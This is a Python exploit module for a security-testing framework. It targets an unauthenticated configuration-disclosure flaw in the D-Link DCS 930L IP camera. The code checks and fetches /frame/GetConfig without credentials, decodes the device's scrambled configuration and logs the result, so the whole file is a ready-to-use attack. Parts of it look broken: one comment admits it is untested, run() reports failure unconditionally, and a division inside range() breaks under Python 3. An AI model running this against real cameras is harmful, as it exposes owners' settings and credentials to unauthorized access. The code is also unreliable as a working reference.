#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DCS 930L Configure Disclosure',
        'description': 'D-Link DCS 930L configure information allow unauthenticated access',
        'reference': ['https://www.exploit-db.com/exploits/24442/'],
    }

    prompt = 'dcs_930l_config'

    def __init__(self):
        super().__init__()

    def check(self, host, port, timeout):
        url = "http://{}:{}/frame/GetConfig".format(host, port)

        resp, err = self.http_get(self.s, url, timeout)
        if err is None:
            if resp.status_code == 200:
                self.print_check_result(True, host)
                return True
        self.print_check_result(False, host)
        return False  # target is not vulnerable

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        url = "http://{}:{}/frame/GetConfig".format(host, port)

        resp, err = self.http_get(self.s, url, timeout)
        if err is None:
            if resp.status_code == 200:
                config = self.deobfuscate(resp.text)
                utils.print_info(config)
                utils.logger.send((host, port, config))

        self.print_check_result(False, host)

    def deobfuscate(self, data):
        r = []
        for c in data:
            c = ord(c)
            c = (c + ord('y')) & 0xff
            c = (c ^ ord('Z')) & 0xff
            c = (c - ord('e')) & 0xff
            r.append(c)

        tmp = None
        i = len(r) - 1
        while i >= 0:
            if i == len(r) - 1:
                x = r[i]
                tmp = ((x & 7) << 5) & 0xff

            if i == 0:
                assert tmp is not None
                x = r[0]
                x = (x >> 3) & 0xff
                x = (x + tmp) & 0xff
                r[0] = x
            else:
                c1 = r[i - 1]
                c2 = r[i]
                c1 &= 0x7
                c2 = (c2 >> 3) & 0xff
                c1 = (c1 << 5) & 0xff
                c2 = (c2 + c1) & 0xff
                r[i] = c2
            i -= 1

        r = "".join([chr(x) for x in r])

        s = ""
        assert (len(r) % 2) == 0
        for i in range(len(r) / 2):
            s += r[i + (len(r) / 2)] + r[i]
        return s


